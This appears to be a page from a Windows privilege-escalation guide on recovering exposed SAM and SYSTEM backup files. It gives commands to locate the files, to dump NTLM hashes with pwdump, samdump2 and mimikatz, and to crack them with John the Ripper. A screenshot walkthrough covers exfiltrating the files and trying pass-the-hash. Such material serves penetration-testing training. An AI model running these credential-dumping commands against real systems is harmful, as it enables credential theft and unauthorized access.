## SAM & SYSTEM

Password hashes for all local users on the system are stored in the `SAM` and `SYSTEM` files. These files are typically protected and inaccessible, but in cases of misconfigurations, they may be exposed through backup copies.

### Verification

Run the following commands to check if these files are located in any of the common locations:

```powershell
@("$env:systemroot\repair\SAM","$env:systemroot\repair\system","$env:systemroot\System32\config\RegBack\SAM","$env:systemroot\System32\config\SAM","$env:systemroot\System32\config\SYSTEM","$env:systemroot\System32\config\RegBack\system") | ForEach-Object {if(Test-Path $_){$_}}
```

```batch
dir %SYSTEMROOT%\repair\SAM
dir %SYSTEMROOT%\repair\system
dir %SYSTEMROOT%\System32\config\RegBack\SAM
dir %SYSTEMROOT%\System32\config\SAM
dir %SYSTEMROOT%\System32\config\SYSTEM
dir %SYSTEMROOT%\System32\config\RegBack\system
```

### Attack

If these two files have been recovered, a dump of the stored hashes can be performed for later use in a "Pass The Hash" attack or for cracking. Various tools can be used to extract the hashes, such as `pwdump`, `samdump2`, or even [[mimikatz]].

```bash
# pwdump
pwdump SYSTEM SAM > /tmp/sam.txt

# samdump2
samdump2 SYSTEM SAM -o /tmp/sam.txt

# Mimikatz
lsadump::sam SYSTEM SAM
```

To crack the hashes:

```bash
john --format=NT --wordlist=rockyou.txt sam.txt
```

## EXAMPLE

We use the script suggested by the tool that searches for the files in known locations.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/credentials/samsystem_1.png)

We copy the two files to our attacker machine.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/credentials/samsystem_2.png)

On the Kali machine, we extract the NTLM hashes using the `samdump2` command.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/seBackup_3.png)

These hashes are stored in a file, `sam.txt`, which can be cracked using John The Ripper, as shown here.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/seBackup_4.png)

Alternatively, a "Pass The Hash" attack can be attempted to gain access to the machine directly without needing to know the credentials.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/users/seBackup_5.png)
